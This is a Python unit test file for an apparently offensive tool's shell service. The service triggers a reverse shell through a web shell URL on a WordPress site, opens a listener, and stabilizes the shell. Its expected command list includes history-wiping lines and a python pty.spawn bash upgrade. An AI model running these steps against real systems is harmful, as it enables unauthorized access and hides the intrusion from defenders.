import unittest, responses
from services import ShellService
from pwnlib.tubes.remote import remote
from config import SHELL_STABILIZATION_METHODS


class ShellServiceTest(unittest.TestCase):
    web_shell_url = 'http://fancy-wordpress-site.com/funny_file.php'
    lhost = '127.0.0.1'
    lport = 8080
    
    def test_prepare_listener(self):
        shell_service = ShellService(self.web_shell_url, self.lhost, self.lport)
        listener = shell_service.prepare_listener()
        remote(self.lhost, self.lport)
        
        self.assertTrue(listener.connected())
        listener.close()
    
    @responses.activate
    def test_execute_rev_shell(self):
        responses.add(**{
            'method'         : responses.GET,
            'url'            : f'{self.web_shell_url}',
            'status'         : 200
        })
        shell_service = ShellService(self.web_shell_url, self.lhost, self.lport)
        shell_service.execute_rev_shell()
    
    def test_upgrade_shell(self):
        shell_service = ShellService(self.web_shell_url, self.lhost, self.lport)
        listener = shell_service.prepare_listener()
        remote_shell = remote(self.lhost, self.lport)
        expected_commands = ['export HISTFILE=/dev/null', 'which python', 'which bash', 'python -c \'import pty; pty.spawn("/bin/bash")\'; exit', 'export HISTFILE=/dev/null', 'stty rows 38 columns 116', " alias ls='ls --color=auto'", 'export TERM=xterm', 'history -c']
        commands_executed = []

        # Mock listener a bit
        def mocked_sendline(x): 
            remote_shell.sendline(b'fake@fake:~$ /usr/bin/python /bin/bash')
            commands_executed.append(x.decode())
        listener.sendline = mocked_sendline

        shell_service.upgrade_shell(listener)
        listener.close()
        self.assertListEqual(commands_executed, expected_commands)

    
    def test_find_pty_spawn_vector(self):
        shell_service = ShellService(self.web_shell_url, self.lhost, self.lport)
        listener = shell_service.prepare_listener()
        remote_shell = remote(self.lhost, self.lport)

        # Mock listener a bit
        def mocked_sendline(x): remote_shell.sendline(b'fake@fake:~$ /usr/bin/python /bin/bash')
        listener.sendline = mocked_sendline

        self.assertEqual(shell_service.find_pty_spawn_vector(listener), SHELL_STABILIZATION_METHODS['python']['bash'])
        listener.close()
    
    def test_find_pty_spawn_vector_error(self):
        shell_service = ShellService(self.web_shell_url, self.lhost, self.lport)
        listener = shell_service.prepare_listener()
        remote_shell = remote(self.lhost, self.lport)

        # Mock listener a bit
        def mocked_sendline(x): remote_shell.sendline(b'fake@fake:~$ ')
        listener.sendline = mocked_sendline

        self.assertRaises(Exception, shell_service.find_pty_spawn_vector, listener)
        listener.close()


if __name__ == '__main__':
    unittest.main()
